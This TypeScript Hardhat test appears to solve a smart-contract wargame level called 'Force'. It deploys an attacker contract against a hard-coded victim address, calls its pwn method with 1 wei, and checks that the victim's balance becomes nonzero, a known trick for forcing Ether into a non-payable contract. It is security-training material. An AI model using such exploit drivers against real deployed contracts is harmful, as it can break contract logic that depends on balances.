import { TransactionResponse } from "@ethersproject/providers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Force", function () {
  it("Pwn", async function () {
    const ADDRESS = "0x80318F9caf804e567956AAb2Ef009063640752ce";
    console.log("Deploying attacker contract...");
    const attackerContract = await ethers.deployContract("contracts/Force.sol:Attacker", [ADDRESS]);
    await attackerContract.deployTransaction.wait();

    console.log("Pwning victim contract...");
    const tx: TransactionResponse = await attackerContract.pwn({ value: 1 });
    await tx.wait();
    const balance = await ethers.provider.getBalance(ADDRESS);
    console.log(`Contract balance: ${balance}`);
    expect(balance).to.be.above(0);
  });
});
